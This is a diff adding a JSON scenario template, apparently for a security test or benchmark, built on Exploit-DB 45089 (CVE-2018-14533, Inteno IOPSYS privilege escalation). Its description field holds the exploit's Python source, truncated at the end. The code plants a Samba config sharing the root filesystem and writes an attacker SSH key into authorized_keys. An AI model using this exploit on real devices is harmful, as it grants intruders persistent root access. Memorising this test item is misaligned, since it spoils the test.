@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_45089",
+  "category": "D1_credential",
+  "attack_technique": "T1552.001",
+  "cwe": "CWE-256",
+  "description": "Linux privilege escalation: Inteno’s IOPSYS - (Authenticated) Local Privilege Escalation (CVE-2018-14533)\n\nExploit source code (45089.py):\n```\n#!/usr/bin/python\n\nimport json\nimport sys\nimport subprocess\nimport socket\nimport os\nfrom websocket import create_connection\n\ndef ubusAuth(host, username, password):\n    ws = create_connection(\"ws://\" + host, header = [\"Sec-WebSocket-Protocol: ubus-json\"])\n    req = json.dumps({\"jsonrpc\":\"2.0\",\"method\":\"call\",\n        \"params\":[\"00000000000000000000000000000000\",\"session\",\"login\",\n        {\"username\": username,\"password\":password}],\n        \"id\":666})\n    ws.send(req)\n    response =  json.loads(ws.recv())\n    ws.close()\n    try:\n        key = response.get('result')[1].get('ubus_rpc_session')\n    except IndexError:\n        return(None)\n    return(key)\n\ndef ubusCall(host, key, namespace, argument, params={}):\n    ws = create_connection(\"ws://\" + host, header = [\"Sec-WebSocket-Protocol: ubus-json\"])\n    req = json.dumps({\"jsonrpc\":\"2.0\",\"method\":\"call\",\n        \"params\":[key,namespace,argument,params],\n        \"id\":666})\n    ws.send(req)\n    response =  json.loads(ws.recv())\n    ws.close()\n    try:\n        result = response.get('result')[1]\n    except IndexError:\n        if response.get('result')[0] == 0:\n            return(True)\n        return(None)\n    return(result)\n\nif __name__ == \"__main__\":\n    host = \"192.168.1.1\"\n    sshkey = \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAkQMU/2HyXNEJ8gZbkxrvLnpSZ4Xz+Wf3QhxXdQ5blDI5IvDkoS4jHoi5XKYHevz8YiaX8UYC7cOBrJ1udp/YcuC4GWVV5TET449OsHBD64tgOSV+3s5r/AJrT8zefJbdc13Fx/Bnk+bovwNS2OTkT/IqYgy9n+fKKkSCjQVMdTTrRZQC0RpZ/JGsv2SeDf/iHRa71keIEpO69VZqPjPVFQfj1QWOHdbTRQwbv0MJm5rt8WTKtS4XxlotF+E6Wip1hbB/e+y64GJEUzOjT6BGooMu/FELCvIs2Nhp25ziRrfaLKQY1XzXWaLo4aPvVq05GStHmTxb+r+WiXvaRv1cbQ==\"\n    user = \"user\"\n    pasw = \"user\"\n    conf = \"\"\"[global]\n\tnetbios name = IntenoSMB\n\tworkgroup = IntenoSMB\n\tserver string = IntenoSMB\n\tsyslog = 10\n\tencrypt passwords = true\n\tpassdb backend = smbpasswd\n\tobey pam restrictions = yes\n\tsocket options = TCP_NODELAY\n\tunix charset = UTF-8\n\tpreferred master = yes\n\tos level = 20\n\tsecurity = user\n\tguest account = root\n\tsmb passwd file = /etc/samba/smbpasswd\n\tinterfaces = 192.168.1.1/24 br-lan\n\tbind interfaces only = yes\n\twide links = no\n\n[pwn]\n\tpath = /\n\tread only = no\n\tguest ok = yes\n\tcreate mask = 0700\n\tdirectory mask = 0700\n\tforce user = root\n\"\"\"\n\n    print(\"Authenticating...\")\n    key = ubusAuth(host, user, pasw)\n    if (not key):\n        print(\"Auth failed!\")\n        sys.exit(1)\n    print(\"Got key: %s\" % key)\n\n    print(\"Dropping evil Samba config...\")\n    ltc = ubusCall(host, key, \"file\", \"write_tmp\",\n        {\"path\":\"/tmp/etc/smb.conf\", \"data\": conf})\n    if (not ltc):\n        print(\"Failed to write evil config!\")\n        sys.exit(1)\n\n    print(\"Creating temp file for key...\")\n    with open(\".key.tmp\",\"a+\") as file:\n        file.write(sshkey)\n        path = os.path.realpath(file.name)\n\n    print(\"Dropping key...\")\n    subprocess.run(\"smbclient {0}pwn -U% -c 'put {1} /etc/dropbear/authorized_keys'\".format(r\"\\\\\\\\\" + host + r\"\\\\\", path),\n        shell=True, check=True)\n    print(\"Key dropped\")\n\n    pr\n```",
+  "cve": "CVE-2018-14533",
+  "exploitdb_id": "45089",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_45089",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ]
+}
